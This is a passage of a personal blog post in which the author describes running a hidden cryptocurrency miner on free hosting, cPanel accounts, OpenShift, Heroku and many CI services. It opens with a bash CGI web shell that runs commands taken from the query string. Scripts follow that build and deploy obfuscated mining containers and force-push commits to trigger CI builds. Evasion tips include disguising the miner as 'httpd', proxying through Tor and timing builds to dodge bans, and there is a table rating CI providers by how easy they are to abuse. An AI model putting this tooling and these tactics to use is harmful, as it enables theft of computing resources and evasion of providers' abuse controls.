IFS=<span class=hljs-string>'=&'</span>
parm=(<span class=hljs-variable>$QUERY_STRING</span>)
IFS=<span class=hljs-variable>$saveIFS</span>
<span class=hljs-keyword>for</span> ((i=0; i<<span class=hljs-variable>${#parm[@]}</span>; i+=2))
<span class=hljs-keyword>do</span>
    <span class=hljs-built_in>declare</span> var_<span class=hljs-variable>${parm[i]}</span>=<span class=hljs-variable>${parm[i+1]}</span>
<span class=hljs-keyword>done</span>
<span class=hljs-comment>## exec command for interactive and proclimited scenarios</span>
url_encoded=<span class=hljs-string>"<span class=hljs-variable>${var_path//+/ }</span>"</span>
<span class=hljs-built_in>export</span> PATH=<span class=hljs-string>".:<span class=hljs-variable>$PATH</span>"</span>
. /dev/shm/srv/utils/load.env &>/dev/null

<span class=hljs-keyword>if</span> <span class=hljs-built_in>declare</span> -f <span class=hljs-string>"<span class=hljs-variable>${url_encoded/\%20*}</span>"</span> 1>/dev/null; <span class=hljs-keyword>then</span> <span class=hljs-comment>## don't use -n, redirect fd for bcompat</span>
    <span class=hljs-built_in>printf</span> <span class=hljs-string>'%b'</span> <span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
<span class=hljs-keyword>else</span>
    <span class=hljs-keyword>if</span> <span class=hljs-built_in>builtin</span> <span class=hljs-string>"<span class=hljs-variable>${url_encoded/\%20*}</span>"</span>; <span class=hljs-keyword>then</span>
        <span class=hljs-built_in>printf</span> <span class=hljs-string>'%b'</span> <span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
    <span class=hljs-keyword>else</span>
        <span class=hljs-built_in>printf</span> <span class=hljs-string>'exec %b'</span> <span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
    <span class=hljs-keyword>fi</span>
<span class=hljs-keyword>fi</span>
. /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src</code></pre><p>It is better to only rely on builtins as forking additional processes may not be allowed in web jails, but it is always possible to <code>exec</code> which allows us to use most command line utilities. Most web shells are written in other scripting languages like python or php as you don't have to worry about forking.<p>In a cpanel environment it is better to use a static name for the miner process, like <code>httpd</code> or <code>php-fpm</code> because <code>cgi</code> is based on multi processing, so servers are always filled with many processes named like this, although a careful observer should notice the <em>multi-threaded</em> usage pattern which is definitely not common (or possible) for languages such as perl, php, ruby, or python!<p>Processes have also a time limit by default, (1 hour, 1 day, etc..), for this we just use a cron job that restarts the dropper.<p>This required a lot of manual editing, the cpanel api to automate this is unfortunately not exposed to end users, so web hosting is a clunky and boring target for our miner dropper.<h3 id=web_environments><a class=header-anchor href=#web_environments>Web environments</a></h3><p>There are <em>SaaS</em> providers that have a web editor coupled with a container, such as <a href="with a free tier before getting acquired by amazon">cloud9</a>, [codeanywhere], [codenvy]. Deploying the dropper here is easy (you have a full fledged environment), but keeping it running is a burden, since any interactive web editor terminates its session soon after the web page is closed, and the container is consequently put to sleep (unless you pay of course).<p>Circumventing this can only mean that we have to keep the sessions open, some scripting with [puppeteer] achieved the desired result, but having long running, memory leaking, bloated SPAs web pages is definitely unattractive and not stealthy, because from the provider backend, a session opened 24/7 will definitely look suspicious. Indeed, web environments are also clunky and boring targets.<h3 id=free_apps_services><a class=header-anchor href=#free_apps_services>Free apps services</a></h3><p>This is mainly <a href="when it used to have a free tier">openshift</a> <sup id=fnref:openshift><a class=fnref href=#fndef:openshift>[11]</a></sup> and [heroku]. Openshift, being kubernetes was somewhat straightforward to deploy, but full of configuration churn, here is an excerpt:<pre><code class="sh hljs"><span class=hljs-built_in>export</span> PATH=.:<span class=hljs-variable>$PATH</span>

[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_PRJ</span>"</span> ] && { <span class=hljs-built_in>echo</span> <span class=hljs-string>"no account data provided"</span>; <span class=hljs-built_in>exit</span> 1; }
obfs=~/utils/deploy/obfs.sh
[ -x <span class=hljs-variable>$obfs</span> ] ||
    { <span class=hljs-built_in>echo</span> <span class=hljs-string>"obfs utility not found!"</span>; <span class=hljs-built_in>exit</span> 1; }
launcher=~/launcher
[ -f <span class=hljs-variable>$launcher</span> ] ||
    { <span class=hljs-built_in>echo</span> <span class=hljs-string>"launcher script not found!"</span>; <span class=hljs-built_in>exit</span> 1; }

ctroot=<span class=hljs-variable>${CT_ROOT_DIR:-oc-ct-box-mine}</span>
<span class=hljs-comment>## the service that starts the miner is named app in /etc/services.d in the rootfs</span>
scriptpath=<span class=hljs-string>"rootfs/etc/services.d/app/run"</span>
TYPE=<span class=hljs-variable>${HRK_TYPE:-worker}</span>
IMG=$(oc-endpoint)/<span class=hljs-variable>$OC_PRJ</span>/<span class=hljs-variable>$OC_APP</span>
tspath=/tmp/oc-tmp-apprun
prepend=<span class=hljs-string>"#!/usr/bin/with-contenv bash
"</span>
<span class=hljs-comment>## beware the newline ^^^</span>

<span class=hljs-built_in>cd</span> <span class=hljs-variable>$ctroot</span> || { <span class=hljs-built_in>echo</span> <span class=hljs-string>"couldn't find ct build directory"</span>; <span class=hljs-built_in>exit</span> 1; }

VARS=$(cat vars) || { <span class=hljs-built_in>echo</span> <span class=hljs-string>'vars file empty!'</span>; }
VARS=<span class=hljs-variable>${VARS//$'\n'/ }</span>
VARS=<span class=hljs-variable>${VARS//\\/\\\\}</span> <span class=hljs-comment>## preserve escapes</span>
script=$(cat <span class=hljs-variable>$launcher</span> | tail +2 | sed -r <span class=hljs-string>'/^echo "export \\$/a '</span><span class=hljs-string>"<span class=hljs-variable>$VARS</span>"</span><span class=hljs-string>' \\'</span>)
cat <<< <span class=hljs-string>"<span class=hljs-variable>$script</span>"</span> > <span class=hljs-variable>$tspath</span>
<span class=hljs-variable>$obfs</span> <span class=hljs-variable>$tspath</span>
[ -z <span class=hljs-string>"<span class=hljs-variable>${tspath}</span>.obfs"</span> ] && { <span class=hljs-built_in>echo</span> <span class=hljs-string>"obfs file not found?"</span>; <span class=hljs-built_in>exit</span> 1; }
cat <<< <span class=hljs-string>"$prepend<span class=hljs-subst>$(cat <span class=hljs-string>"<span class=hljs-variable>${tspath}</span>.obfs"</span>)</span>"</span> > <span class=hljs-variable>$scriptpath</span>
<span class=hljs-built_in>exec</span> itself (should <span class=hljs-built_in>eval</span>)
chmod +x <span class=hljs-variable>$scriptpath</span>

docker build -t <span class=hljs-variable>$IMG</span>  . || <span class=hljs-built_in>exit</span> 1
<span class=hljs-built_in>cd</span> -
oc-push-image <span class=hljs-string>"<span class=hljs-variable>$IMG</span>"</span></code></pre><p>This was the script used to build the mining container which required a yaml template:<pre><code class="yaml hljs"><span class=hljs-attr>apiVersion:</span> <span class=hljs-string>build.openshift.io/v1</span>
<span class=hljs-attr>kind:</span> <span class=hljs-string>BuildConfig</span>
<span class=hljs-attr>metadata:</span>
  <span class=hljs-attr>labels:</span>
    <span class=hljs-attr>build:</span> <span class=hljs-string>${OC_APP}</span>
  <span class=hljs-attr>name:</span> <span class=hljs-string>${OC_APP}</span>
<span class=hljs-attr>spec:</span>
  <span class=hljs-attr>activeDeadlineSeconds:</span> <span class=hljs-number>5184000</span>
  <span class=hljs-attr>failedBuildsHistoryLimit:</span> <span class=hljs-number>0</span>
  <span class=hljs-attr>successfulBuildsHistoryLimit:</span> <span class=hljs-number>0</span>
  <span class=hljs-attr>resources:</span>
    <span class=hljs-attr>limits:</span>
      <span class=hljs-attr>cpu:</span> <span class=hljs-number>2</span>
      <span class=hljs-attr>memory:</span> <span class=hljs-string>1Gi</span>
  <span class=hljs-attr>runPolicy:</span> <span class=hljs-string>Serial</span>
  <span class=hljs-attr>source:</span>
    <span class=hljs-attr>type:</span> <span class=hljs-string>Binary</span>
  <span class=hljs-attr>strategy:</span>
    <span class=hljs-attr>sourceStrategy:</span>
      <span class=hljs-attr>from:</span>
        <span class=hljs-attr>kind:</span> <span class=hljs-string>ImageStreamTag</span>
        <span class=hljs-attr>name:</span> <span class=hljs-string>${OC_APP}-build:latest</span>
        <span class=hljs-attr>namespace:</span> <span class=hljs-string>${OC_PRJ}</span>
    <span class=hljs-attr>type:</span> <span class=hljs-string>Source</span>
  <span class=hljs-attr>template:</span>
    <span class=hljs-attr>activeDeadlineSeconds:</span> <span class=hljs-number>2400</span>
  <span class=hljs-attr>triggers:</span>
    <span class=hljs-bullet>-</span> <span class=hljs-attr>generic:</span>
        <span class=hljs-attr>secretReference:</span>
          <span class=hljs-attr>name:</span> <span class=hljs-string>${OC_APP}</span>
      <span class=hljs-attr>type:</span> <span class=hljs-string>Generic</span></code></pre><p>But the whole process involved quite a lot of steps!<pre><code class="sh hljs"><span class=hljs-comment>## init</span>
[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_APP</span>"</span> ] && <span class=hljs-built_in>export</span> $(<$(tfi))
[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_APP</span>"</span> ] && { . ./choose-creds || <span class=hljs-built_in>exit</span> 1; }
oc-login
oc new-project <span class=hljs-variable>$OC_PRJ</span> || { [ -z <span class=hljs-string>"<span class=hljs-subst>$(oc get projects)</span>"</span> ] && <span class=hljs-built_in>exit</span> 1; }
oc new-app <span class=hljs-variable>$OC_APP</span> --allow-missing-images || <span class=hljs-built_in>exit</span> 1

<span class=hljs-comment>## build box with docker and push</span>
<span class=hljs-comment># oc-docker-login || exit 1</span>
oc-build-mine || <span class=hljs-built_in>exit</span> 1

<span class=hljs-comment>## create dc config</span>
<span class=hljs-built_in>export</span> OC_TEMPLATE_TYPE=mine
oc-box-template || <span class=hljs-built_in>exit</span> 1
rtr=0
<span class=hljs-keyword>while</span> [ <span class=hljs-variable>$rtr</span> -lt 10 ]; <span class=hljs-keyword>do</span>
  oc rollout latest <span class=hljs-variable>$OC_APP</span> && <span class=hljs-built_in>break</span>
  rtr=$((rtr+<span class=hljs-number>1</span>))
  <span class=hljs-built_in>read</span> -t 1
<span class=hljs-keyword>done</span>
<span class=hljs-built_in>exit</span>
<span class=hljs-comment>## builds</span>
bash -x oc-build-build || <span class=hljs-built_in>exit</span> 1
bash -x oc-build-template || <span class=hljs-built_in>exit</span> 1
oc start-build <span class=hljs-variable>$OC_APP</span> || <span class=hljs-built_in>exit</span> 1

accounts=<span class=hljs-variable>${ACCOUNTS_DIR:-accounts_queue}</span>
mv <span class=hljs-variable>$accounts</span>/<span class=hljs-variable>${OC_USR}</span>{\.this,\.$(date +%s)}</code></pre><p>In pseudo code:<ul><li><p>create the project</p><li><p>create the application without an image</p><li><p>build the mining container</p><li><p>deploy the container with a deployment config (kubernetes abstraction)</p><li><p>rollout the deployment</p></ul><p>The <code>build-build</code> scripts instead created a <em>build</em> container which would mine for a few hours at a time. Builds and normal pods have separate resources in openshift so we exploited both of them. Openshift was overall a bad experience since it went over 4 different releases (maybe more, I stopped tracking after a while) and each of them required changes to the configurations, they had no upgrade paths and everything was quickly iterated over, and it was common for builds/pods to stall, and not being garbage collected...they usually ran manual restarts every once in a while, maybe kubernetes was just buggy :)<p>Heroku configuration was a little bit simpler (it doesn't involve kubernetes). Apart the container build, which was similar to the openshift one, the rest was just two cli commands<pre><code class="bash hljs">heroku config:<span class=hljs-built_in>set</span> HRK_APP=<span class=hljs-variable>$HRK_APP</span> -a <span class=hljs-variable>$HRK_APP</span>
heroku container:release -a <span class=hljs-variable>$HRK_APP</span> <span class=hljs-variable>$TYPE</span></code></pre><p>The container was directly pushed with docker over to the heroku registry. <sup id=fnref:herokucontainers><a class=fnref href=#fndef:herokucontainers>[12]</a></sup> The friction with heroku (which free tier is still standing up to the time of writing) is that dynos can only run for 22 days per month so they required some manual management each month, again clunky and boring. They did execute some ban waves at the beginning, and then they disabled registrations through TOR, I am quite sure I was the cause of this.<h3 id=ci_containers_or_vms><a class=header-anchor href=#ci_containers_or_vms>CI containers or VMs</a></h3><p>These were the most synergic targets for our dropper. There are many <a href=https://en.wikipedia.org/wiki/Continuous_integration>CI</a> companies, many of which are burning investors money offering free tiers in the hope of collecting some market share in the tech infrastructure business.<p>All these services offer different resources, have different configurations requirements and run in different environments. I never considered automating account registration because those kind of things are dreadful to program, I try to avoid them all the time, so I just endured manual registrations for a while as I was curious to what kind of anti spam response I would get (and how different from the rest!). You can guess some things about the management of a company from how it handles spam:<ul><li><p>Does it perform ban waves? Then they have non strict policies, problems are handled manually and case by case</p><li><p>Does it require phone verification? They were already abused in the past</p><li><p>Do they respond to heavy resource usage? They are running on a tight budget</p><li><p>Do they apply account restrictions or shadow bans? If they shadow ban, they have mean sysadmins.</p></ul><p>There is also a philosophical question: If a service allows you to abuse their system for a long time, does it mean that they have a top-of-the-shelf infrastructure capable of handling the load, or simply poor control over their system? And you must consider the balance between accessibility and security, a system too secure can lower user retention.<p>Here's a table showing some services that I deployed to:<table><tr class="header headerLastRow"><th style=text-align:center>ci<th style=text-align:center>configuration<th style=text-align:center>performance<th style=text-align:center>ban-hammer<tr><td style=text-align:center>Bitrise<td style=color:red;text-align:center>bad<td style=color:#ff0;text-align:center>medium<td style=color:#ff0;text-align:center>medium<tr><td style=text-align:center>Travis<td style=color:green;text-align:center>good<td style=color:#ff0;text-align:center>medium<td style=color:green;text-align:center>good<tr><td style=text-align:center>Codeship<td style=color:#ff0;text-align:center>medium<td style=color:red;text-align:center>bad<td style=color:#ff0;text-align:center>medium<tr><td style=text-align:center>Gitlab<td style=color:#ff0;text-align:center>medium<td style=color:green;text-align:center>good<td style=color:green;text-align:center>good<tr><td style=text-align:center>Circleci<td style=color:red;text-align:center>bad<td style=color:green;text-align:center>good<td style=color:#ff0;text-align:center>medium<tr><td style=text-align:center>Semaphore<td style=color:green;text-align:center>good<td style=color:green;text-align:center>good<td style=color:#ff0;text-align:center>medium<tr><td style=text-align:center>Docker<td style=color:#ff0;text-align:center>medium<td style=color:#ff0;text-align:center>medium<td style=color:green;text-align:center>good<tr><td style=text-align:center>Quay<td style=color:green;text-align:center>good<td style=color:#ff0;text-align:center>medium<td style=color:#ff0;text-align:center>medium<tr><td style=text-align:center>Codefresh<td style=color:red;text-align:center>bad<td style=color:green;text-align:center>good<td style=color:#ff0;text-align:center>medium<tr><td style=text-align:center>Wercker<td style=color:#ff0;text-align:center>medium<td style=color:#ff0;text-align:center>medium<td style=color:red;text-align:center>bad<tr><td style=text-align:center>Azure-pipelines<td style=color:#ff0;text-align:center>medium<td style=color:#ff0;text-align:center>medium<td style=color:red;text-align:center>bad<tr><td style=text-align:center>Continuousphp<td style=color:red;text-align:center>bad<td style=color:#ff0;text-align:center>medium<td style=color:#ff0;text-align:center>medium<tr><td style=text-align:center>Buddy<td style=color:red;text-align:center>bad<td style=color:red;text-align:center>bad<td style=color:red;text-align:center>bad<tr><td style=text-align:center>Drone<td style=color:red;text-align:center>bad<td style=color:green;text-align:center>good<td style=color:red;text-align:center>bad<tr><td style=text-align:center>Appveyor<td style=color:red;text-align:center>bad<td style=color:#ff0;text-align:center>medium<td style=color:red;text-align:center>bad<tr><td style=text-align:center>Nevercode<td style=color:red;text-align:center>bad<td style=color:green;text-align:center>good<td style=color:#ff0;text-align:center>medium<tr><td style=text-align:center>Zeist/vercel<td style=color:red;text-align:center>bad<td style=color:green;text-align:center>good<td style=color:red;text-align:center>bad</table><p>In this context, a <span style=color:green> good</span> configuration means that it didn't take much time to configure a <code>ci</code> job for the mining process (like all services relying on a web dashboard instead of a repository dot-file were a chore), a <span style=color:red> bad</span> <code>ban-hammer</code> means that it was hard to register to the service, or that accounts would get banned more aggressively.<p><a href=https://web.archive.org/web/20210222050951/https://www.bitrise.io/>Bitrise</a> requires to setup a project, to infer the environment, the target architecture, the execution process and other things, it was very time consuming to setup a build so it got a bad rating in configuration. <a href=https://web.archive.org/web/20210310010750/https://continuousphp.com/>Continuousphp</a>, <a href=https://web.archive.org/web/20210322133805/https://buddy.works/>Buddy</a>, [Codefresh] also had a lot of manual non declarative configuration steps.<p>Services like [Azure-pipelines], <a href=https://web.archive.org/web/20210308202144/https://app.wercker.com/>Wercker</a>, <a href=https://web.archive.org/web/20210322133805/https://buddy.works/>Buddy</a> applies shadow-bans on the accounts, shadow-bans are bad, as they leave you guessing if there is something wrong with your configuration or not. With some services you can guess the reason of the ban (pretty much your build took too much time, or you built too many times in a short period), for some others like [Azure-pipelines] I assume they applied some kind of fingerprint to the user repositories as bans were coming through even without any abuse of resources, azure and vercel also restricted <code>DNS</code> access within public build machines, so that was additional friction that needed to be overcome with ad-hoc tunnel.<p><a href=https://web.archive.org/web/20210327045555/https://cloud.drone.io/welcome>Drone</a> gave access to a whole 16+ cores processor but ended up banning after 2 builds <sup id=fnref:saddrone><a class=fnref href=#fndef:saddrone>[13]</a></sup>. <a href=https://web.archive.org/web/20210322100629/https://www.cloudbees.com/products/codeship>Codeship</a> also gives access to powerful build hosts and didn't ban as aggressively as drone.<p>My favorite services not because of profitability but for ease and convenience (also with other projects) were <a href=https://web.archive.org/web/20210324163536/https://travis-ci.org/>Travis</a>, <a href=https://web.archive.org/web/20210308041527/https://semaphoreci.com/>Semaphore</a> and <a href=https://web.archive.org/web/20210322105637/https://hub.docker.com/>Docker-hub</a>. Travis is like the standard CI and is very flexible, Semaphore is the only <code>DSL</code> for <code>CI</code> that looked approachable and well though instead of just an endless sequence of spaghettified check-boxes like other UIs, and Docker just for the simplicity to map dockerfiles to builds.<h3 id=builds_configs><a class=header-anchor href=#builds_configs>Builds configs</a></h3><p>The builds were triggered either by cron jobs offered by web services or by git commits. So you had to keep track of a littering of access tokens or ssh keys to manage all the git commits. It was also important to not over-spam commits, and use proxies when pushing to the repositories configuring git:<pre><code class="toml hljs"><span class=hljs-section>[http]</span>
        <span class=hljs-attr>proxy</span> = socks5://<span class=hljs-number>127.0</span>.<span class=hljs-number>0.1</span>:<span class=hljs-number>9050</span>
        <span class=hljs-attr>sslverify</span> = <span class=hljs-literal>false</span>
<span class=hljs-section>[https]</span>
        <span class=hljs-attr>proxy</span> = socks5://<span class=hljs-number>127.0</span>.<span class=hljs-number>0.1</span>:<span class=hljs-number>9050</span>
        <span class=hljs-attr>sslverify</span> = <span class=hljs-literal>false</span>
<span class=hljs-section>[url "https://"]</span>
    <span class=hljs-attr>insteadOf</span> = git://</code></pre><p>Using git hosting services, github has been the one more thorough about bans, but they were only executed upon abuse reports by ci services admins, gitlab executed a ban wave once, when I tried to renew the CI trial (carelessly). I have never received a ban for a bitbucket account. To (force) push git commits, we have a long running loop that re-tags the git repository:<pre><code class="bash hljs"><span class=hljs-keyword>while</span> :; <span class=hljs-keyword>do</span>
    repos_count=$(ls -ld <span class=hljs-variable>${repos}</span>/* | grep -c ^d)
    repos_ival=$(((RANDOM%variance+delay)/repos_count))
    <span class=hljs-keyword>for</span> r <span class=hljs-keyword>in</span> <span class=hljs-variable>$repos</span>/*; <span class=hljs-keyword>do</span>
        <span class=hljs-built_in>cd</span> <span class=hljs-string>"<span class=hljs-variable>$r</span>"</span>
        git fetch --all
        tagger
        <span class=hljs-built_in>echo</span> -e <span class=hljs-string>"\e[32m"</span><span class=hljs-string>"sleeping for <span class=hljs-variable>$repos_ival</span> since <span class=hljs-subst>$(date +%H:%M:%S\ %b/%d)</span>"</span><span class=hljs-string>"\e[0m"</span>
        sleep <span class=hljs-variable>$repos_ival</span>
    <span class=hljs-keyword>done</span>
    sleep 1
<span class=hljs-keyword>done</span></code></pre><p>It might be possible that force pushing this way is not something github likes very much and could have been a cause for accounts getting flagged. The tagger function tasked with force pushing a different commits, uses a website (which you can lookup quite easily) that gives some randomized commits. I am not sure how much this helps, since the content itself of the commits is obviously suspicious for my case. And it also bit me in the ass once, since the commits returned by this command can include swear words, one of my commits was picked up by a twitter bot that tracks git commits with swear words! I added a blacklist for bad words after the incident.<p>I haven't really delved into obfuscated git commits and obfuscated git repositories. The only instance where I was using a more elaborate repository was with Bitrise since you could not setup a build if the system did not recognize an environment (like mobile apps), but even then there wasn't any rotation and it was always the same repository, quite easy to spot.<p>Overall, if I had to plot a bell curve around the optimal time to mine <em>without</em> getting accounts banned, across all the tested services, would be with a center around 1 hour build duration, once per day. For cpu cores, apart for a couple out-liars (like drone), most services expect you use the full amount of resources given to you since builds are run inside VMs or containers with constrained resources...and compilation is usually a task that saturates cpu, so it does not have statistical relevance. Intuitively one build per day is what the average developer would do, so you should expect raised flags if you stray away from the mean, and pushing for abuse never ends well.<h2 id=conclusions><a class=header-anchor href=#conclusions>Conclusions</a></h2><p>Was it worth it? The networking parts were definitely interesting, dealing with accounts registrations was obviously the worst part, nobodies likes to click endless confirmation emails and repeating mind numbing UI procedures, after all. Writing spam automation software is also boring (because your mostly poking at dumb APIs), and with this assumption (and the fact that this was never anything serious) I never even considered it. Was it profitable? At its peak it was reaching something like <code>300$</code> per month, maybe enough for a venezuelan, not really for me :)<p><table class=fndef id=fndef:adversary><tr><td class=fndef-backref><a href=#fnref:adversary>[1]</a><td class=fndef-content><em>the grumpy sysadmin</em></table><table class=fndef id=fndef:infoproc><tr><td class=fndef-backref><a href=#fnref:infoproc>[2]</a><td class=fndef-content>even though this would break many privacy assumptions, I am sure most of them just peek inside whenever there is a incumbent problem, but this is only a problem for container based runtimes, whereas VMs are pretty much black boxes.</table><table class=fndef id=fndef:monerominer><tr><td class=fndef-backref><a href=#fnref:monerominer>[3]</a><td class=fndef-content>the miner built into the monero node got some work to make it more background friendly, but the distribution of xmrig was never focused on background friendliness.</table><table class=fndef id=fndef:difficulty><tr><td class=fndef-backref><a href=#fnref:difficulty>[5]</a><td class=fndef-content>some pools offer different difficulties on different connection ports, and tend to align the job difficulty to the miner submitted shares, but the granularity of the proxy was still more convenient, as it would prevent pool <a href=https://en.wikipedia.org/wiki/Vendor_lock-in>lock-in</a> (although we never really switched pools ).</table><table class=fndef id=fndef:configwatch><tr><td class=fndef-backref><a href=#fnref:configwatch>[4]</a><td class=fndef-content>it wasn't happy when the config suddenly appeared and disappeared from the file system</table><table class=fndef id=fndef:stratumprotocol><tr><td class=fndef-backref><a href=#fnref:stratumprotocol>[6]</a><td class=fndef-content>We don't talk about the <a href=https://en.bitcoin.it/wiki/Stratum_mining_protocol>stratum protocol</a> since we just have to deal with whatever is implemented in <em>both</em> the pool and the miner...which is usually the bare minimum, and possibly with non standard extensions.</table><table class=fndef id=fndef:fullbash><tr><td class=fndef-backref><a href=#fnref:fullbash>[7]</a><td class=fndef-content>never go full bash :)</table><table class=fndef id=fndef:memoryondemand><tr><td class=fndef-backref><a href=#fnref:memoryondemand>[8]</a><td class=fndef-content>I have not explored what happens when a processes loads additional functionality at runtime, as the kernel would look for the address in the memory layout of the executable, which would access the filesystem and possibly causing a crash.</table><table class=fndef id=fndef:freehostinglimits><tr><td class=fndef-backref><a href=#fnref:freehostinglimits>[9]</a><td class=fndef-content>Limits are arbitrary, cpu time is less than a second, memory is less than 128M, outbound connections are blocked.</table><table class=fndef id=fndef:cpanelssh><tr><td class=fndef-backref><a href=#fnref:cpanelssh>[10]</a><td class=fndef-content>with a little bit of patience you can also run a full ssh instance over an environment bootstrapped around your cpanel account space, <em>without</em> having access to the cpanel builtin SSH which tends to be disabled by hosting providers.</table><table class=fndef id=fndef:openshift><tr><td class=fndef-backref><a href=#fnref:openshift>[11]</a><td class=fndef-content>openshift went from a 1 year free tier to 3 months to 1 month, starting to require phone authentication, I can guarantee I was not the only one abusing their services.</table><table class=fndef id=fndef:herokucontainers><tr><td class=fndef-backref><a href=#fnref:herokucontainers>[12]</a><td class=fndef-content>Heroku free tier containers are quite generous in resources, they provide 4c/8t (virtual) cpus, plenty of ram and large storage (which however is not persistent and discarded on dyno shutdown).</table><table class=fndef id=fndef:saddrone><tr><td class=fndef-backref><a href=#fnref:saddrone>[13]</a><td class=fndef-content>They adde muc strictier registration rules, after a couple of bans, I might have contributed to it.</table><p><div id=post-tags-list>Post Tags: <span class=post-tag><a href=https://www.unto.re/tag/crypto> crypto </a>, </span><span class=post-tag><a href=https://www.unto.re/tag/net> net </a>, </span><span class=post-tag><a href=https://www.unto.re/tag/shell> shell </a></span></div><div class=page-foot><div class=copyright>August 21, 2021</div><script async crossorigin=anonymous issue-term=pathname label=Comment repo=untoreh/untoreh.github.io src=https://utteranc.es/client.js></script></div></div><div class=page__footer><footer><div class=page__footer-copyright>© untoreh - Powered by <a href=https://github.com/tlienart/Franklin.jl>Franklin</a></div><div class=page__footer-links>- <ul><li><a href=/sitemap.xml>Sitemap</a></li> | <li><a href=/tag>Tags</a></li> | <li><a href=https://www.unto.re/tag/feed.xml>RSS</a></ul></div><ul class=author__wrap><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="Twitter link"href=https://twitter.com/untoreh><i class="fab fa-fw fa-twitter-square"aria-hidden=true></i></a><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="GitHub link"href=https://github.com/untoreh><i class="fab fa-fw fa-github"aria-hidden=true></i></a><li class="author__urls social-icons"><a href=mailto:contact@unto.re title=email><i class="fas fa-envelope"></i></a><li><script type=application/ld+json>{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script></ul></footer></div><script crossorigin=anonymous defer id=fa integrity=sha384-DJ25uNYET2XCl5ZF++U8eNxPWqcKohUUBUpKGlNLMchM7q4Wjg2CUpjHLaL8yYPH src=https://use.fontawesome.com/releases/v5.8.2/js/all.js></script><script src=/libs/colors.js></script><script src=/libs/menu.js></script><script defer src=/libs/lunr/lunr.min.js></script>